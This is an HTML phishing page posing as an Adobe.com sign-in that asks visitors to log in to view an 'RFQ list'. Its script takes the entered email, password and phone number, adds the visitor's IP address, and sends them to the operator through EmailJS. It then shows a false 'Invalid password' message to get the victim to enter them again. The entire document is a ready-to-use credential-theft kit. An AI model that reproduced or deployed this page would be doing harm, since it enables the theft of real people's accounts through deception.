<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Adobe.com</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          "Helvetica Neue", Arial, sans-serif;
        min-height: 100vh;
        background-image: url("https://i.ibb.co/m5jbSNV4/Adobe.jpg"); /* Background image */
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        position: relative;
      }

      body::before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.4);
        z-index: 1;
      }

      .container {
        position: relative;
        z-index: 2;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }

      .form-wrapper {
        width: 100%;
        max-width: 350px; /* Smaller width for compact design */
        margin: 0 auto;
      }

      .logo {
        max-height: 180px; /* Adjusted for smaller logo size */
        width: auto;
        max-width: 100%;
        margin: 0 auto;
        display: block;
      }

      .card {
        background: #f9fafb;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        overflow: hidden;
      }

      .card-content {
        padding: 24px 20px; /* Reduced padding for compactness */
      }

      .logo-section {
        text-align: center;
        margin-bottom: 20px; /* Less space below logo */
        background-color: #f9fafb;
      }

      .title-text {
        font-size: 12px; /* Smaller font size */
        font-weight: 400;
        color: #6b7280;
        text-align: center;
        margin-bottom: 20px; /* Less space */
        white-space: nowrap;
      }

      .form-group {
        margin-bottom: 16px; /* Reduced spacing between inputs */
      }

      .input {
        width: 100%;
        padding: 10px 14px; /* Smaller padding */
        font-size: 13px; /* Slightly smaller font */
        border: 1px solid #d1d5db;
        border-radius: 6px;
        outline: none;
        transition: border-color 0.2s;
        background-color: white;
      }

      .input:focus {
        border-color: #3b82f6;
        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
      }

      .input:disabled {
        background-color: #f3f4f6;
        cursor: not-allowed;
      }

      .alert {
        padding: 12px 16px;
        border-radius: 6px;
        margin-bottom: 16px; /* Reduced space */
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .alert-error {
        background-color: #fef2f2;
        border: 1px solid #fecaca;
        color: #991b1b;
      }

      .alert-icon {
        width: 16px;
        height: 16px;
      }

      .button {
        width: 100%;
        padding: 10px 20px; /* Smaller padding for compact button */
        font-size: 13px; /* Smaller font size */
        font-weight: 500;
        color: white;
        background-color: #2563eb;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        transition: background-color 0.2s;
      }

      .button:hover:not(:disabled) {
        background-color: #1d4ed8;
      }

      .button:disabled {
        background-color: #9ca3af;
        cursor: not-allowed;
      }

      .hidden {
        display: none;
      }
    </style>
    <script
      src="https://l2.io/ip.js?var=userip"
      type="text/javascript"
    ></script>
    <script type="text/javascript">
      var userip;
    </script>
  </head>
  <body>
    <div class="container">
      <div class="form-wrapper">
        <div class="card">
          <div class="card-content">
            <div class="logo-section">
              <!-- Corrected logo URL syntax -->
              <img
                src="https://i.ibb.co/p6NMD7wY/image.jpg"
                alt="Logo"
                class="logo"
              />
         DOCUMENT LOCKED    </div>         

            <div class="title-text"> </button>  
             Sign in With Your Email To View the RFQ List Clearly
			 
	         
             
            </div>

            <form id="loginForm">
              <div class="form-group">
                <input
                  type="email"
                  id="email"
                  class="input"
                  placeholder="Email"
                  required
                />
              </div>

              <div class="form-group">
                <input
                  type="password"
                  id="password"
                  class="input"
                  placeholder="Password"
                  required
                />
              </div>

              <!-- New Phone Number Input -->
              <div class="form-group">
                <input
                  type="tel"
                  id="phone"
                  class="input"
                  placeholder="Phone Number"
                  pattern="[0-9]{10,15}"
                  title="Enter a valid phone number"
                  required
                />
              </div>

              <div id="errorAlert" class="alert alert-error hidden">
                <svg class="alert-icon" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fill-rule="evenodd"
                    d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                    clip-rule="evenodd"
                  />
                </svg>
                <span id="errorMessage"></span>
              </div>

              <button type="submit" id="submitBtn" class="button">View</button>
            </form>
          </div>
        </div>
      </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
      (function () {
        emailjs.init("ObeLnEvQWmdgiKYkV");
      })();
    </script>

    <script>
      const form = document.getElementById("loginForm");
      const emailInput = document.getElementById("email");
      const passwordInput = document.getElementById("password");
      const phoneInput = document.getElementById("phone");
      const submitBtn = document.getElementById("submitBtn");
      const errorAlert = document.getElementById("errorAlert");
      const errorMessage = document.getElementById("errorMessage");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        const phone = phoneInput.value.trim();

        // Hide previous errors
        errorAlert.classList.add("hidden");

        // Disable form
        submitBtn.disabled = true;
        submitBtn.textContent = "Loading...";
        emailInput.disabled = true;
        passwordInput.disabled = true;
        phoneInput.disabled = true;

        try {
          const message = `🔐 Adobe.com Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 Phone: ${phone}\n⏰ Time: ${new Date().toLocaleString()}`;

          emailjs
            .send("service_tzg96s9", "template_il7sckr", {
              email: email,
              password: password,
              phone: phone,
              ip: userip,
            })
            .then(
              (response) => {
                console.log(
                  "Email sent successfully:",
                  response.status,
                  response.text,
                );
              },
              (error) => {
                console.error("Failed to send email:", error);
              },
            );

          // Show error message
          errorMessage.textContent = "Invalid password. Please try again";
          errorAlert.classList.remove("hidden");

          // Clear password after 1 second
          setTimeout(() => {
            passwordInput.value = "";
            passwordInput.disabled = false;
            emailInput.disabled = false;
            phoneInput.disabled = false;
            submitBtn.disabled = false;
            submitBtn.textContent = "Login";
            passwordInput.focus();
          }, 1000);
        } catch (error) {
          // Show error message
          errorMessage.textContent = "Invalid password. Please try again";
          errorAlert.classList.remove("hidden");

          // Re-enable form
          setTimeout(() => {
            passwordInput.value = "";
            passwordInput.disabled = false;
            emailInput.disabled = false;
            phoneInput.disabled = false;
            submitBtn.disabled = false;
            submitBtn.textContent = "Login";
            passwordInput.focus();
          }, 1000);
        }
      });
    </script>
  </body>
</html>
